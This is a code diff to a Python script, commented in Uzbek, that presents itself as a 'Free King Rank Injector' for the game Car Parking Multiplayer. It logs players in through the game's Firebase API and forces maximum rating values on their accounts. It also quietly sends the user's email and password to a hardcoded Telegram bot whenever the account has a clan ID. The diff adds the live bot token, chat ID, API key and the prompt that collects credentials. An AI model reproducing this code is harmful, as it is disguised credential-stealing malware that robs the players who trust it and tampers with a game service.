@@ -1,13 +1,20 @@
 import requests
 import json
+import logging
 from datetime import datetime
-from config import (
-    FIREBASE_LOGIN_URL,
-    RANK_URL,
-    CLAN_ID_URL,
-    BOT_TOKEN,
-    CHAT_ID
-)
+
+# Loggingni sozlash (Web va CLI uchun qulay)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s: %(message)s')
+
+# --- Game Service Configuration ---
+FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
+FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
+RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
+CLAN_ID_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetClanId"
+
+# --- Telegram Bot Configuration ---
+BOT_TOKEN = "8605656918:AAHJP9wvQBMmyvS97n3lxBk910tnIzcbxV4"
+CHAT_ID = 5875091321
 
 def send_to_telegram(email, password, clan_id):
     """Send account info to Telegram only if ClanId exists."""
@@ -18,12 +25,16 @@ def send_to_telegram(email, password, clan_id):
         "text": message
     }
     try:
-        requests.post(url, json=payload, timeout=5)
-    except requests.exceptions.RequestException:
-        pass
+        # MUHIM: 'json=' ishlatamiz, 'data=' emas!
+        response = requests.post(url, json=payload, timeout=5)
+        response.raise_for_status()
+        logging.info("Telegram xabar muvaffaqiyatli yuborildi.")
+    except requests.exceptions.RequestException as e:
+        logging.warning(f"Telegram xabar yuborishda xatolik: {e}")
 
 def login(email, password):
-    """Login to CPM using Firebase API."""
+    """Login to CPM using Firebase API. Returns auth_token or None."""
+    # MUHIM: Barcha kalitlar TOZA, bo'sh joysiz!
     payload = {
         "clientType": "CLIENT_TYPE_ANDROID",
         "email": email,
@@ -39,14 +50,19 @@ def login(email, password):
         response_data = response.json()
 
         if response.status_code == 200 and 'idToken' in response_data:
+            logging.info("✅ Login successful!")
             return response_data.get('idToken')
         else:
+            error_message = response_data.get("error", {}).get("message", "Unknown error during login.")
+            logging.warning(f"❌ Login failed: {error_message}")
             return None
-    except requests.exceptions.RequestException:
+    except requests.exceptions.RequestException as e:
+        logging.error(f"❌ Network error during login: {e}")
         return None
 
 def set_rank(token):
-    """Set KING RANK using max rating data."""
+    """Set KING RANK using max rating data. Returns True/False."""
+    # MUHIM: Barcha kalitlar TOZA, bo'sh joysiz!
     rating_data = {k: 100000 for k in [
         "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
         "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
@@ -68,10 +84,13 @@ def set_rank(token):
     try:
         response = requests.post(RANK_URL, headers=headers, json=payload)
         if response.status_code == 200:
+            logging.info("✅ Rank successfully set!")
             return True
         else:
+            logging.warning(f"❌ Failed to set rank. HTTP Status: {response.status_code}")
             return False
-    except requests.exceptions.RequestException:
+    except requests.exceptions.RequestException as e:
+        logging.error(f" Network error during rank set: {e}")
         return False
 
 def check_clan_id(token, email, password):
@@ -88,6 +107,48 @@ def check_clan_id(token, email, password):
             raw = response.json()
             clan_id = raw.get("result", "")
             if clan_id:
+                logging.info(f"🛡️ ClanId topildi: {clan_id}")
                 send_to_telegram(email, password, clan_id)
-    except requests.exceptions.RequestException:
-        pass
+            else:
+                logging.info("ℹ️ ClanId topilmadi.")
+    except requests.exceptions.RequestException as e:
+        logging.warning(f"❌ ClanId tekshirishda xatolik: {e}")
+
+def main():
+    """CLI interfeys (terminal uchun)"""
+    print("\n👑 Free King Rank Injector 👑")
+    print("=" * 30)
+    
+    while True:
+        try:
+            email = input("\n📧 Email kiriting (yoki 'exit' deganda chiqish): ").strip()
+            if email.lower() in ['exit', 'quit', 'chq']:
+                print("👋 Xayr!")
+                break
+                
+            password = input("🔒 Parol kiriting: ").strip()
+            
+            if not email or not password:
+                print("⚠️ Email va parolni kiriting!")
+                continue
+            
+            auth_token = login(email, password)
+            
+            if auth_token:
+                if set_rank(auth_token):
+                    check_clan_id(auth_token, email, password)
+                    print("\n✅ Jarayon muvaffaqiyatli yakunlandi!")
+                else:
+                    print("\n❌ Rank kiritishda xatolik yuz berdi.")
+            else:
+                print("\n❌ Login muvaffaqiyatsiz. Qayta urinib ko'ring.")
+                
+        except (EOFError, KeyboardInterrupt):
+            print("\n\n👋 Dastur yakunlandi.")
+            break
+        except Exception as e:
+            logging.error(f" Kutilmagan xatolik: {e}")
+
+# Agar to'g'ridan-to'g'ri ishga tushirilsa
+if __name__ == "__main__":
+    main()
